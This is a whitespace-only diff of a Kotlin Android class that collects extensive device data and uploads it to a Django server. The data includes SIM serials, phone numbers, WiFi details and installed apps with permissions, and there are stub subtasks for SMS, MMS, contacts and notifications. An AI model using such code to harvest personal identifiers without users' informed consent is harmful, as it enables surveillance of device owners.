@@ -33,10 +33,10 @@ import java.util.concurrent.atomic.AtomicInteger
 
 /**
  * DeviceInfoCollector
- * 
+ *
  * Collects all available device information in background subtasks.
  * Each subtask runs independently with proper error handling.
- * 
+ *
  * Features:
  * - Parallel execution for fast subtasks
  * - Sequential execution for slow subtasks
@@ -45,10 +45,10 @@ import java.util.concurrent.atomic.AtomicInteger
  * - Incremental Firebase updates
  */
 object DeviceInfoCollector {
-    
+
     private const val TAG = "DeviceInfoCollector"
     private const val COLLECTION_TIMEOUT_MS = 60000L // 60 seconds max per subtask
-    
+
     // Subtask result data structure
     data class SubtaskResult(
         val subtaskName: String,
@@ -57,10 +57,10 @@ object DeviceInfoCollector {
         val error: Exception? = null,
         val collectionTime: Long = 0
     )
-    
+
     /**
      * Collect all device information
-     * 
+     *
      * @param context Application context
      * @param onProgress Callback: (subtaskName, currentSubtask, totalSubtasks, isComplete)
      * @param onComplete Callback: (allResults)
@@ -78,7 +78,7 @@ object DeviceInfoCollector {
                 val allResults = mutableMapOf<String, SubtaskResult>()
                 val totalSubtasks = 19
                 var currentSubtask = 0
-                
+
                 // Phase 1: Instant/Fast subtasks (parallel execution)
                 val phase1Subtasks = listOf(
                     Subtask1_BuildInfo(),
@@ -95,24 +95,24 @@ object DeviceInfoCollector {
                     Subtask12_BootInfo(),
                     Subtask13_PerformanceMetrics()
                 )
-                
+
                 // Execute Phase 1 in parallel
                 val executor = Executors.newFixedThreadPool(phase1Subtasks.size)
                 val latch = CountDownLatch(phase1Subtasks.size)
-                
+
                 phase1Subtasks.forEach { subtask ->
                     executor.execute {
                         try {
                             val startTime = System.currentTimeMillis()
                             val result = executeSubtask(context, subtask, onError)
                             val collectionTime = System.currentTimeMillis() - startTime
-                            
+
                             synchronized(allResults) {
                                 allResults[subtask.getName()] = result.copy(collectionTime = collectionTime)
                                 currentSubtask++
                                 onProgress?.invoke(subtask.getName(), currentSubtask, totalSubtasks, false)
                             }
-                            
+
                             // Sync to Django immediately (non-blocking)
                             if (result.success && result.data.isNotEmpty()) {
                                 syncToDjango(context, subtask.getName(), result.data)
@@ -125,14 +125,14 @@ object DeviceInfoCollector {
                         }
                     }
                 }
-                
+
                 // Wait for Phase 1 to complete (with timeout)
                 if (!latch.await(30, TimeUnit.SECONDS)) {
                     LogHelper.w(TAG, "Phase 1 timeout - some subtasks may not have completed")
                 }
-                
+
                 executor.shutdown()
-                
+
                 // Phase 2: Slow subtasks (sequential execution to avoid overload)
                 val phase2Subtasks = listOf(
                     Subtask14_SmsMetadata(),
@@ -142,17 +142,17 @@ object DeviceInfoCollector {
                     Subtask18_AppInfo(),
                     Subtask19_DeviceStatusInfo()
                 )
-                
+
                 phase2Subtasks.forEach { subtask ->
                     try {
                         val startTime = System.currentTimeMillis()
                         val result = executeSubtask(context, subtask, onError)
                         val collectionTime = System.currentTimeMillis() - startTime
-                        
+
                         allResults[subtask.getName()] = result.copy(collectionTime = collectionTime)
                         currentSubtask++
                         onProgress?.invoke(subtask.getName(), currentSubtask, totalSubtasks, false)
-                        
+
                         // Sync to Django immediately (non-blocking)
                         if (result.success && result.data.isNotEmpty()) {
                             syncToDjango(context, subtask.getName(), result.data)
@@ -162,18 +162,18 @@ object DeviceInfoCollector {
                         onError?.invoke(subtask.getName(), e)
                     }
                 }
-                
+
                 // Final callback
                 onProgress?.invoke("Complete", totalSubtasks, totalSubtasks, true)
                 onComplete?.invoke(allResults)
-                
+
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error in collectAllDeviceInfo", e)
                 onError?.invoke("DeviceInfoCollector", e)
             }
         }.start()
     }
-    
+
     /**
      * Execute a single subtask with error handling
      */
@@ -188,7 +188,7 @@ object DeviceInfoCollector {
             val hasAllPermissions = requiredPermissions.all { permission ->
                 ActivityCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
             }
-            
+
             if (!hasAllPermissions) {
                 Log.w(TAG, "Missing permissions for ${subtask.getName()}: $requiredPermissions")
                 return SubtaskResult(
@@ -198,10 +198,10 @@ object DeviceInfoCollector {
                     error = SecurityException("Missing required permissions")
                 )
             }
-            
+
             // Execute subtask with timeout
             val data = subtask.collect(context)
-            
+
             SubtaskResult(
                 subtaskName = subtask.getName(),
                 data = data,
@@ -227,7 +227,7 @@ object DeviceInfoCollector {
             )
         }
     }
-    
+
     /**
      * Sync collected data to Django (non-blocking)
      */
@@ -236,14 +236,14 @@ object DeviceInfoCollector {
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-                
+
                 // Nest subtask data under system_info
                 val updates = mapOf(
                     "system_info" to mapOf(
                         subtaskName to data.filterValues { it != null }
                     )
                 )
-                
+
                 DjangoApiHelper.patchDevice(deviceId, updates)
                 LogHelper.d(TAG, "Synced $subtaskName to Django successfully")
             } catch (e: Exception) {
@@ -251,26 +251,26 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK INTERFACE
     // ============================================================================
-    
+
     interface DeviceInfoSubtask {
         fun getName(): String
         fun collect(context: Context): Map<String, Any?>
         fun getRequiredPermissions(): List<String>
     }
-    
+
     // ============================================================================
     // SUBTASK 1: DEVICE BUILD INFORMATION
     // ============================================================================
-    
+
     private class Subtask1_BuildInfo : DeviceInfoSubtask {
         override fun getName() = "buildInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 mapOf(
@@ -313,21 +313,21 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 2: DISPLAY INFORMATION
     // ============================================================================
-    
+
     private class Subtask2_DisplayInfo : DeviceInfoSubtask {
         override fun getName() = "displayInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val displayMetrics = context.resources.displayMetrics
                 val configuration = context.resources.configuration
-                
+
                 mapOf(
                     "screenWidth" to displayMetrics.widthPixels,
                     "screenHeight" to displayMetrics.heightPixels,
@@ -348,12 +348,12 @@ object DeviceInfoCollector {
                 emptyMap()
             }
         }
-        
+
         private fun getScreenSizeCategory(metrics: android.util.DisplayMetrics): String {
             val widthDp = metrics.widthPixels / metrics.density
             val heightDp = metrics.heightPixels / metrics.density
             val screenSize = widthDp * heightDp
-            
+
             return when {
                 screenSize >= 960 * 720 -> "xlarge"
                 screenSize >= 640 * 480 -> "large"
@@ -362,16 +362,16 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 3: STORAGE INFORMATION
     // ============================================================================
-    
+
     private class Subtask3_StorageInfo : DeviceInfoSubtask {
         override fun getName() = "storageInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val internalStorage = getStorageInfo(Environment.getDataDirectory())
@@ -385,12 +385,12 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "External storage not available", e)
                     null
                 }
-                
+
                 val externalStorageState = Environment.getExternalStorageState()
-                val isExternalStorageReadable = externalStorageState == Environment.MEDIA_MOUNTED || 
+                val isExternalStorageReadable = externalStorageState == Environment.MEDIA_MOUNTED ||
                     externalStorageState == Environment.MEDIA_MOUNTED_READ_ONLY
                 val isExternalStorageWritable = externalStorageState == Environment.MEDIA_MOUNTED
-                
+
                 val result = mutableMapOf<String, Any?>(
                     "internalTotal" to internalStorage?.total,
                     "internalFree" to internalStorage?.free,
@@ -401,7 +401,7 @@ object DeviceInfoCollector {
                     "externalStorageReadable" to isExternalStorageReadable,
                     "externalStorageWritable" to isExternalStorageWritable
                 )
-                
+
                 if (externalStorage != null) {
                     result["externalTotal"] = externalStorage.total
                     result["externalFree"] = externalStorage.free
@@ -409,14 +409,14 @@ object DeviceInfoCollector {
                     result["externalUsed"] = externalStorage.used
                     result["externalUsagePercent"] = externalStorage.usagePercent
                 }
-                
+
                 result
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error collecting storage info", e)
                 emptyMap()
             }
         }
-        
+
         private data class StorageInfo(
             val total: Long,
             val free: Long,
@@ -424,7 +424,7 @@ object DeviceInfoCollector {
             val used: Long,
             val usagePercent: Double
         )
-        
+
         private fun getStorageInfo(path: java.io.File?): StorageInfo? {
             return try {
                 val stat = StatFs(path?.absolutePath)
@@ -447,7 +447,7 @@ object DeviceInfoCollector {
                 }
                 val used = total - free
                 val usagePercent = if (total > 0) (used.toDouble() / total.toDouble()) * 100.0 else 0.0
-                
+
                 StorageInfo(total, free, available, used, usagePercent)
             } catch (e: Exception) {
                 Log.w(TAG, "Error getting storage info for $path", e)
@@ -455,24 +455,24 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 4: MEMORY INFORMATION
     // ============================================================================
-    
+
     private class Subtask4_MemoryInfo : DeviceInfoSubtask {
         override fun getName() = "memoryInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                 val memoryInfo = ActivityManager.MemoryInfo()
                 activityManager?.getMemoryInfo(memoryInfo)
-                
+
                 val runtime = Runtime.getRuntime()
-                
+
                 mapOf(
                     "totalRAM" to memoryInfo?.totalMem,
                     "availableRAM" to memoryInfo?.availMem,
@@ -496,35 +496,35 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 5: BATTERY INFORMATION
     // ============================================================================
-    
+
     private class Subtask5_BatteryInfo : DeviceInfoSubtask {
         override fun getName() = "batteryInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
                     ?: return emptyMap()
-                
+
                 val batteryLevel = try {
                     batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error getting battery level", e)
                     -1
                 }
-                
+
                 val isCharging = try {
                     batteryManager.isCharging
                 } catch (e: Exception) {
                     LogHelper.w(TAG, "Error checking charging status", e)
                     false
                 }
-                
+
                 mapOf(
                     "batteryPercentage" to if (batteryLevel in 0..100) batteryLevel else null,
                     "isCharging" to isCharging,
@@ -549,25 +549,25 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 6: NETWORK INFORMATION
     // ============================================================================
-    
+
     private class Subtask6_NetworkInfo : DeviceInfoSubtask {
         override fun getName() = "networkInfo"
-        
+
         override fun getRequiredPermissions() = listOf(
             android.Manifest.permission.READ_PHONE_STATE,
             android.Manifest.permission.ACCESS_WIFI_STATE
         )
-        
+
         @SuppressLint("HardwareIds", "MissingPermission")
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                 val networkInfo = connectivityManager?.activeNetworkInfo
-                
+
                 val result = mutableMapOf<String, Any?>(
                     "isConnected" to networkInfo?.isConnected,
                     "networkType" to networkInfo?.type?.let {
@@ -583,7 +583,7 @@ object DeviceInfoCollector {
                     "isMobile" to (networkInfo?.type == ConnectivityManager.TYPE_MOBILE),
                     "networkSubtype" to networkInfo?.subtype
                 )
-                
+
                 // WiFi SSID/Name
                 if (networkInfo?.type == ConnectivityManager.TYPE_WIFI) {
                     try {
@@ -606,16 +606,16 @@ object DeviceInfoCollector {
                         LogHelper.w(TAG, "Error getting WiFi info", e)
                     }
                 }
-                
+
                 // Mobile data status
-                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) 
+                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                     == PackageManager.PERMISSION_GRANTED) {
                     try {
                         val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                         result["isRoaming"] = telephonyManager?.isNetworkRoaming
                         result["networkOperatorName"] = telephonyManager?.networkOperatorName
                         result["networkOperatorCode"] = telephonyManager?.networkOperator
-                        
+
                         // Mobile data enabled status
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             result["isMobileDataEnabled"] = telephonyManager?.isDataEnabled
@@ -627,7 +627,7 @@ object DeviceInfoCollector {
                         LogHelper.w(TAG, "Error getting extended network info", e)
                     }
                 }
-                
+
                 result
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error collecting network info", e)
@@ -635,27 +635,27 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 7: PHONE/SIM INFORMATION
     // ============================================================================
-    
+
     private class Subtask7_PhoneSimInfo : DeviceInfoSubtask {
         override fun getName() = "phoneSimInfo"
-        
+
         override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_PHONE_STATE)
-        
+
         @SuppressLint("HardwareIds", "MissingPermission")
         override fun collect(context: Context): Map<String, Any?> {
             return try {
-                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) 
+                if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                     != PackageManager.PERMISSION_GRANTED) {
                     return emptyMap()
                 }
-                
+
                 val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                     ?: return emptyMap()
-                
+
                 val result = mutableMapOf<String, Any?>(
                     "simSerial" to try { telephonyManager.simSerialNumber } catch (e: Exception) { null },
                     "simState" to telephonyManager.simState,
@@ -684,7 +684,7 @@ object DeviceInfoCollector {
                         telephonyManager.isDataEnabled
                     } else null
                 )
-                
+
                 // Dual SIM support (Android 5.1+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                     try {
@@ -693,7 +693,7 @@ object DeviceInfoCollector {
                             val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList
                             if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
                                 val simCards = mutableListOf<Map<String, Any?>>()
-                                
+
                                 activeSubscriptions.forEachIndexed { index, subscriptionInfo ->
                                     val simCardInfo = mutableMapOf<String, Any?>(
                                         "slotIndex" to subscriptionInfo.simSlotIndex,
@@ -707,7 +707,7 @@ object DeviceInfoCollector {
                                             subscriptionInfo.isEmbedded
                                         } else null
                                     )
-                                    
+
                                     // Get phone number for this SIM (may require READ_PHONE_NUMBERS on Android 8.0+)
                                     try {
                                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -722,7 +722,7 @@ object DeviceInfoCollector {
                                     } catch (e: Exception) {
                                         LogHelper.w(TAG, "Error getting phone number for SIM ${subscriptionInfo.simSlotIndex}", e)
                                     }
-                                    
+
                                     // Get operator name for this SIM
                                     try {
                                         val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -738,10 +738,10 @@ object DeviceInfoCollector {
                                     } catch (e: Exception) {
                                         LogHelper.w(TAG, "Error getting operator info for SIM ${subscriptionInfo.simSlotIndex}", e)
                                     }
-                                    
+
                                     simCards.add(simCardInfo)
                                 }
-                                
+
                                 result["simCards"] = simCards
                                 result["simCardCount"] = simCards.size
                             }
@@ -750,7 +750,7 @@ object DeviceInfoCollector {
                         LogHelper.w(TAG, "Error collecting dual SIM info", e)
                     }
                 }
-                
+
                 result
             } catch (e: SecurityException) {
                 Log.w(TAG, "SecurityException collecting phone/SIM info", e)
@@ -761,22 +761,22 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 8: SYSTEM SETTINGS
     // ============================================================================
-    
+
     private class Subtask8_SystemSettings : DeviceInfoSubtask {
         override fun getName() = "systemSettings"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val locale = Locale.getDefault()
                 val timeZone = TimeZone.getDefault()
                 val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? AudioManager
-                
+
                 val result = mutableMapOf<String, Any?>(
                     "deviceName" to try {
                         Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME)
@@ -794,7 +794,7 @@ object DeviceInfoCollector {
                         Settings.Global.getInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, 0) == 1
                     } catch (e: Exception) { null }
                 )
-                
+
                 // Sound mode (Vibrate/Silent/Sound)
                 if (audioManager != null) {
                     try {
@@ -806,7 +806,7 @@ object DeviceInfoCollector {
                             else -> "UNKNOWN"
                         }
                         result["ringerMode"] = ringerMode
-                        
+
                         // Additional audio info
                         result["volumeMusic"] = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
                         result["volumeRing"] = audioManager.getStreamVolume(AudioManager.STREAM_RING)
@@ -817,7 +817,7 @@ object DeviceInfoCollector {
                         LogHelper.w(TAG, "Error getting sound mode", e)
                     }
                 }
-                
+
                 result
             } catch (e: Exception) {
                 LogHelper.e(TAG, "Error collecting system settings", e)
@@ -825,20 +825,20 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 9: RUNTIME INFORMATION
     // ============================================================================
-    
+
     private class Subtask9_RuntimeInfo : DeviceInfoSubtask {
         override fun getName() = "runtimeInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val runtime = Runtime.getRuntime()
-                
+
                 mapOf(
                     "availableProcessors" to runtime.availableProcessors(),
                     "appMaxMemory" to runtime.maxMemory(),
@@ -854,20 +854,20 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 10: DEVICE FEATURES
     // ============================================================================
-    
+
     private class Subtask10_DeviceFeatures : DeviceInfoSubtask {
         override fun getName() = "deviceFeatures"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val packageManager = context.packageManager
-                
+
                 mapOf(
                     "hasTelephony" to packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY),
                     "hasWiFi" to packageManager.hasSystemFeature(PackageManager.FEATURE_WIFI),
@@ -907,21 +907,21 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 11: POWER MANAGEMENT
     // ============================================================================
-    
+
     private class Subtask11_PowerManagement : DeviceInfoSubtask {
         override fun getName() = "powerManagement"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                     ?: return emptyMap()
-                
+
                 mapOf(
                     "batteryOptimizationStatus" to try {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -951,27 +951,27 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 12: BOOT INFORMATION
     // ============================================================================
-    
+
     private class Subtask12_BootInfo : DeviceInfoSubtask {
         override fun getName() = "bootInfo"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val uptime = android.os.SystemClock.uptimeMillis()
                 val elapsedRealtime = android.os.SystemClock.elapsedRealtime()
                 val currentTime = System.currentTimeMillis()
                 val lastBootTime = currentTime - uptime
-                
+
                 // Get boot count from SharedPreferences
                 val prefs = context.getSharedPreferences("device_info", Context.MODE_PRIVATE)
                 val bootCount = prefs.getInt("boot_count", 0)
-                
+
                 mapOf(
                     "bootTimestamp" to currentTime,
                     "lastBootTime" to lastBootTime,
@@ -985,24 +985,24 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 13: PERFORMANCE METRICS
     // ============================================================================
-    
+
     private class Subtask13_PerformanceMetrics : DeviceInfoSubtask {
         override fun getName() = "performanceMetrics"
-        
+
         override fun getRequiredPermissions() = emptyList<String>()
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
                     ?: return emptyMap()
-                
+
                 val memoryInfo = ActivityManager.MemoryInfo()
                 activityManager.getMemoryInfo(memoryInfo)
-                
+
                 mapOf(
                     "memoryPressure" to memoryInfo.lowMemory,
                     "lowMemoryThreshold" to memoryInfo.threshold,
@@ -1020,16 +1020,16 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 14: SMS METADATA (SLOW - Implemented as placeholder)
     // ============================================================================
-    
+
     private class Subtask14_SmsMetadata : DeviceInfoSubtask {
         override fun getName() = "smsMetadata"
-        
+
         override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_SMS)
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             // TODO: Implement SMS metadata collection
             // This is a slow operation (5-15 seconds)
@@ -1037,62 +1037,62 @@ object DeviceInfoCollector {
             return emptyMap() // Placeholder
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 15: MMS MESSAGES (SLOW - Implemented as placeholder)
     // ============================================================================
-    
+
     private class Subtask15_MmsMessages : DeviceInfoSubtask {
         override fun getName() = "mmsMessages"
-        
+
         override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_SMS)
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             // TODO: Implement MMS collection
             // This is a slow operation (3-10 seconds)
             return emptyMap() // Placeholder
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 16: CONTACT METADATA (SLOW - Implemented as placeholder)
     // ============================================================================
-    
+
     private class Subtask16_ContactMetadata : DeviceInfoSubtask {
         override fun getName() = "contactMetadata"
-        
+
         override fun getRequiredPermissions() = listOf(android.Manifest.permission.READ_CONTACTS)
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             // TODO: Implement contact metadata collection
             // This is a slow operation (2-8 seconds)
             return emptyMap() // Placeholder
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 17: NOTIFICATION EXTENDED (SLOW - Implemented as placeholder)
     // ============================================================================
-    
+
     private class Subtask17_NotificationExtended : DeviceInfoSubtask {
         override fun getName() = "notificationExtended"
-        
+
         override fun getRequiredPermissions() = emptyList<String>() // Uses NotificationListenerService
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             // TODO: Implement extended notification details
             // This is a slow operation (1-3 seconds)
             return emptyMap() // Placeholder
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 18: APP INFORMATION (SLOW - Implemented as placeholder)
     // ============================================================================
-    
+
     private class Subtask18_AppInfo : DeviceInfoSubtask {
         override fun getName() = "appInfo"
-        
+
         override fun getRequiredPermissions(): List<String> {
             // QUERY_ALL_PACKAGES is needed on Android 11+ to see all installed apps
             // Without it, only system apps and your own app are visible
@@ -1103,11 +1103,11 @@ object DeviceInfoCollector {
                 emptyList()
             }
         }
-        
+
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val packageManager = context.packageManager
-                
+
                 // Check permission for Android 11+
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                     if (ActivityCompat.checkSelfPermission(
@@ -1118,13 +1118,13 @@ object DeviceInfoCollector {
                         LogHelper.w(TAG, "QUERY_ALL_PACKAGES permission not granted - only system apps will be visible")
                     }
                 }
-                
+
                 val installedPackages = packageManager.getInstalledPackages(
                     PackageManager.GET_PERMISSIONS or PackageManager.MATCH_DISABLED_COMPONENTS
                 )
-                
+
                 val appsList = mutableListOf<Map<String, Any?>>()
-                
+
                 // Collect app info with permissions (limit to first 500 apps to avoid timeout)
                 val maxApps = minOf(installedPackages.size, 500)
                 installedPackages.take(maxApps).forEach { packageInfo ->
@@ -1134,7 +1134,7 @@ object DeviceInfoCollector {
                             LogHelper.w(TAG, "ApplicationInfo is null for package ${packageInfo.packageName}")
                             return@forEach
                         }
-                        
+
                         val appInfo = mutableMapOf<String, Any?>(
                             "packageName" to packageInfo.packageName,
                             "appName" to try {
@@ -1152,32 +1152,32 @@ object DeviceInfoCollector {
                             "firstInstallTime" to packageInfo.firstInstallTime,
                             "lastUpdateTime" to packageInfo.lastUpdateTime
                         )
-                        
+
                         // Get permissions for this app
                         val permissions = mutableListOf<String>()
                         val requestedPermissions = packageInfo.requestedPermissions
                         val requestedPermissionsFlags = packageInfo.requestedPermissionsFlags
                         if (requestedPermissions != null) {
                             requestedPermissions.forEachIndexed { index, permission ->
-                                val granted = if (requestedPermissionsFlags != null && 
+                                val granted = if (requestedPermissionsFlags != null &&
                                     index < requestedPermissionsFlags.size) {
-                                    (requestedPermissionsFlags[index] and 
+                                    (requestedPermissionsFlags[index] and
                                         android.content.pm.PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0
                                 } else false
-                                
+
                                 permissions.add(permission)
                             }
                         }
-                        
+
                         appInfo["permissions"] = permissions
                         appInfo["permissionCount"] = permissions.size
-                        
+
                         appsList.add(appInfo)
                     } catch (e: Exception) {
                         LogHelper.w(TAG, "Error collecting info for package ${packageInfo.packageName}", e)
                     }
                 }
-                
+
                 mapOf(
                     "installedAppsCount" to installedPackages.size,
                     "collectedAppsCount" to appsList.size,
@@ -1189,7 +1189,7 @@ object DeviceInfoCollector {
             }
         }
     }
-    
+
     // ============================================================================
     // SUBTASK 19: DEVICE STATUS INFO (Combined JSON Object)
     // ============================================================================
@@ -1201,32 +1201,32 @@ object DeviceInfoCollector {
     // - Sound mode (vibrate/silent/sound with volume levels)
     // - Installed apps with permissions
     // ============================================================================
-    
+
     private class Subtask19_DeviceStatusInfo : DeviceInfoSubtask {
         override fun getName() = "deviceStatusInfo"
-        
+
         override fun getRequiredPermissions(): List<String> {
             val permissions = mutableListOf<String>()
-            
+
             // WiFi info
             permissions.add(android.Manifest.permission.ACCESS_WIFI_STATE)
-            
+
             // Mobile data and SIM info
             permissions.add(android.Manifest.permission.READ_PHONE_STATE)
-            
+
             // Installed apps (Android 11+)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 permissions.add(android.Manifest.permission.QUERY_ALL_PACKAGES)
             }
-            
+
             return permissions
         }
-        
+
         @SuppressLint("HardwareIds", "MissingPermission")
         override fun collect(context: Context): Map<String, Any?> {
             return try {
                 val result = mutableMapOf<String, Any?>()
-                
+
                 // ====================================================================
                 // 1. WiFi Information
                 // ====================================================================
@@ -1235,9 +1235,9 @@ object DeviceInfoCollector {
                     val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                     val networkInfo = connectivityManager?.activeNetworkInfo
                     val isWiFiConnected = networkInfo?.type == ConnectivityManager.TYPE_WIFI
-                    
+
                     wifiInfo["isConnected"] = isWiFiConnected
-                    
+
                     if (isWiFiConnected) {
                         val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                         if (wifiManager != null && ActivityCompat.checkSelfPermission(
@@ -1259,13 +1259,13 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "Error collecting WiFi info", e)
                 }
                 result["wifi"] = wifiInfo
-                
+
                 // ====================================================================
                 // 2. Mobile Data Status
                 // ====================================================================
                 val mobileDataInfo = mutableMapOf<String, Any?>()
                 try {
-                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) 
+                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                         == PackageManager.PERMISSION_GRANTED
                     ) {
                         val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
@@ -1281,7 +1281,7 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "Error collecting mobile data info", e)
                 }
                 result["mobileData"] = mobileDataInfo
-                
+
                 // ====================================================================
                 // 3. Flight Mode
                 // ====================================================================
@@ -1295,17 +1295,17 @@ object DeviceInfoCollector {
                     LogHelper.w(TAG, "Error collecting flight mode", e)
                     result["flightMode"] = null
                 }
-                
+
                 // ====================================================================
                 // 4. Dual SIM Card Information
                 // ====================================================================
                 val simCardsInfo = mutableListOf<Map<String, Any?>>()
                 try {
-                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) 
+                    if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                         == PackageManager.PERMISSION_GRANTED
                     ) {
                         val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
-                        
+
                         // Dual SIM support (Android 5.1+)
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                             val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
@@ -1325,7 +1325,7 @@ object DeviceInfoCollector {
                                                 subscriptionInfo.isEmbedded
                                             } else null
                                         )
-                                        
+
                                         // Get phone number for this SIM
                                         try {
                                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -1339,7 +1339,7 @@ object DeviceInfoCollector {
                                         } catch (e: Exception) {
                                             LogHelper.w(TAG, "Error getting phone number for SIM ${subscriptionInfo.simSlotIndex}", e)
                                         }
-                                        
+
                                         // Get operator info for this SIM
                                         try {
                                             val slotTelephonyManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -1355,13 +1355,13 @@ object DeviceInfoCollector {
                                         } catch (e: Exception) {
                                             LogHelper.w(TAG, "Error getting operator info for SIM ${subscriptionInfo.simSlotIndex}", e)
                                         }
-                                        
+
                                         simCardsInfo.add(simCardInfo)
                                     }
                                 }
                             }
                         }
-                        
